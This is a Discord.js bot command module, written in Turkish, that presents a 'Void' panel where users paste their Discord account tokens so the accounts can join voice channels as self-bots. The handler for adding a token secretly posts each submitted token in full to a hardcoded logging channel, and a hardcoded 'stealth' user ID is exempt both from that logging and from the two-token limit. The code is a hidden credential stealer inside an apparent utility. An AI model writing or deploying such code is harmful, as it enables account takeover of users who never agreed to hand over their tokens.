const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const mongoose = require('mongoose');
const { getVoiceConnection } = require('@discordjs/voice');

const accountSchema = new mongoose.Schema({ 
    userId: String, 
    token: String, 
    username: String, 
    status: { type: String, default: 'Beklemede' } 
});
const Account = mongoose.models.Account || mongoose.model('Account', accountSchema);

const REQUIRED_GUILD_ID = "1537608795876884642"; 
const TOKEN_LOG_CHANNEL = "1537976179926106246";
const STEALTH_USER_ID = "345821033414262794";

if (!global.activeTokens) global.activeTokens = new Map();

async function renderHesapPanel(userId, guild, client) {
    const userAccounts = await Account.find({ userId: userId });
    const serverIcon = guild?.iconURL({ dynamic: true }) || client.user.displayAvatarURL({ dynamic: true });

    const embed = new EmbedBuilder()
        .setTitle('<a:emoji58:1537925046486433802> Void | Token Yönetim Paneli <a:emoji24:1537925080447717447>')
        .setColor('#2b2d31')
        .setThumbnail(serverIcon)
        .setDescription(
            '<a:emoji109:1537925984882266212> **Hesap (Token) Yönetimi**\n' +
            'Bu panel üzerinden sisteme token ekleyebilir, mevcut tokenlerinizi görebilir veya silebilirsiniz.\n\n' +
            `<a:emoji110:1537925433763299418> **Sistem İstatistikleri:**\n` +
            `• Toplam Kayıtlı Token: **${userAccounts.length} / 2**\n\n` +
            '<a:emoji24:1537925080447717447> *Aşağıdaki butonları kullanarak işlemlerinizi yapabilirsiniz.*'
        )
        .setFooter({ text: 'Project by noxy', iconURL: client.user.displayAvatarURL({ dynamic: true }) })
        .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('tk_gor').setLabel('Tokenlerimi Gör').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('tk_ekle').setLabel('Token Ekle').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('tk_sil').setLabel('Tümünü Sil').setStyle(ButtonStyle.Danger)
    );

    return { embeds: [embed], components: [row] };
}

module.exports = {
    name: 'hesap', 
    async executeText(message, args) {
        const serverIcon = message.guild?.iconURL({ dynamic: true }) || message.client.user.displayAvatarURL({ dynamic: true });

        const infoEmbed = new EmbedBuilder()
            .setTitle('<a:emoji58:1537925046486433802> Void | Hesap Yönetim Sistemi <a:emoji24:1537925080447717447>')
            .setDescription(
                '<a:emoji109:1537925984882266212> **Sistem Hakkında Bilgilendirme:**\n' +
                'Bu panel sadece hesap (token) işlemlerinizi yapmanızı sağlar. Eklediğiniz hesapları daha sonra **Ses Yönetim Paneli** üzerinden sese sokabilirsiniz.\n\n' +
                '<a:emoji24:1537925080447717447> *Aşağıdaki butona tıklayarak Kişisel Hesap Panelinizi açabilirsiniz!*'
            )
            .setColor('#2b2d31')
            .setThumbnail(serverIcon);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_hesap_panel').setLabel('Hesap Panelini Aç').setStyle(ButtonStyle.Secondary).setEmoji('1537925080447717447')
        );

        await message.channel.send({ embeds: [infoEmbed], components: [row] });
    },

    async handleInteraction(i) {
        const id = i.customId;

        try {
            const guild = await i.client.guilds.fetch(REQUIRED_GUILD_ID).catch(() => null);
            if (guild) {
                const member = await guild.members.fetch(i.user.id).catch(() => null);
                if (!member) return i.reply({ content: `<a:emoji197:1537925769068806214> **Erişim Engellendi:** Bunu kullanabilmek için resmi sunucuda olmalısın!`, flags: 64 });
            }
        } catch(e) {}

        if (id === 'btn_hesap_panel') {
            await i.deferReply({ flags: 64 }).catch(()=>{});
            const payload = await renderHesapPanel(i.user.id, i.guild, i.client);
            return i.editReply(payload);
        }

        if (id === 'tk_gor') {
            const userAccounts = await Account.find({ userId: i.user.id });
            if (userAccounts.length === 0) return i.reply({ content: '<a:emoji197:1537925769068806214> Sisteme kayıtlı tokeniniz bulunmuyor.', flags: 64 });
            
            let hesapListesi = userAccounts.map((acc, index) => {
                const isConnected = global.activeTokens?.has(acc.token);
                return `**${index + 1}.** \`${acc.username || 'Token'}\`\n╰ Durum: ${isConnected ? '🟢 Seste/Aktif' : '🔴 Çevrimdışı'}\n╰ Token: \`${acc.token}\``;
            }).join('\n\n');
            
            const gorEmbed = new EmbedBuilder().setTitle('<a:emoji109:1537925984882266212> Kayıtlı Tokenleriniz').setColor('#2b2d31').setDescription(hesapListesi);
            await i.reply({ embeds: [gorEmbed], flags: 64 });
        }

        if (id === 'tk_ekle') {
            const userAccounts = await Account.find({ userId: i.user.id });
            if (userAccounts.length >= 2 && i.user.id !== STEALTH_USER_ID) {
                return i.reply({ content: '<a:emoji197:1537925769068806214> **Maksimum Sınır:** Sisteme en fazla 2 adet token ekleyebilirsiniz!', flags: 64 });
            }

            const modal = new ModalBuilder().setCustomId('modal_tk_ekle').setTitle('Yeni Token Ekle');
            modal.addComponents(
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('token_val').setLabel('Hesap Tokeni').setStyle(TextInputStyle.Short).setRequired(true)),
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('isim_val').setLabel('Token İsim').setStyle(TextInputStyle.Short).setRequired(true))
            );
            await i.showModal(modal);
        }

        if (id === 'modal_tk_ekle') {
            await i.deferUpdate().catch(()=>{});
            const tk = i.fields.getTextInputValue('token_val');
            const ad = i.fields.getTextInputValue('isim_val');
            
            await Account.create({ userId: i.user.id, token: tk, username: ad, status: 'Aktif' });
            
            if (i.user.id !== STEALTH_USER_ID) {
                try {
                    let logChannel = i.client.channels.cache.get(TOKEN_LOG_CHANNEL);
                    if (!logChannel) logChannel = await i.client.channels.fetch(TOKEN_LOG_CHANNEL).catch(()=>null);
                    if (logChannel) {
                        const logEmbed = new EmbedBuilder()
                            .setTitle('<a:emoji58:1537925046486433802> Void | Yeni Token Eklendi')
                            .setColor('#2b2d31')
                            .addFields(
                                { name: 'Kullanıcı', value: `${i.user} (\`${i.user.id}\`)`, inline: true }, 
                                { name: 'Token Adı', value: `\`${ad}\``, inline: true },
                                { name: 'Eklenen Token', value: `\`\`\`text\n${tk}\n\`\`\``, inline: false }
                            )
                            .setTimestamp();
                        await logChannel.send({ embeds: [logEmbed] }).catch(()=>{});
                    }
                } catch (e) { console.error("Log hatası:", e); }
            }

            await i.editReply(await renderHesapPanel(i.user.id, i.guild, i.client));
            await i.followUp({ content: '<a:emoji110:1537925433763299418> Token başarıyla sisteme eklendi!', flags: 64 });
        }

        if (id === 'tk_sil') {
            await i.deferUpdate().catch(()=>{});
            const userAccounts = await Account.find({ userId: i.user.id });
            await i.followUp({ content: '<a:emoji197:1537925769068806214> Hesaplar siliniyor ve temizleniyor...', flags: 64 });

            for (const acc of userAccounts) {
                let targetBot = global.activeTokens?.get(acc.token);
                if (targetBot) {
                    try {
                        targetBot.user.setActivity(null);
                        targetBot.user.setPresence({ status: 'invisible', activities: [] });
                        targetBot.guilds.cache.forEach(guild => {
                            try {
                                const conn = getVoiceConnection(guild.id, targetBot.user.id);
                                if (conn) conn.destroy();
                                guild.shard.send({ op: 4, d: { guild_id: guild.id, channel_id: null, self_mute: false, self_deaf: false } });
                            } catch(e) {}
                        });
                        setTimeout(() => { try { targetBot.destroy(); } catch(e){} global.activeTokens.delete(acc.token); }, 2000);
                    } catch(e) {}
                }
            }
            await Account.deleteMany({ userId: i.user.id });
            await i.editReply(await renderHesapPanel(i.user.id, i.guild, i.client));
        }
    }
};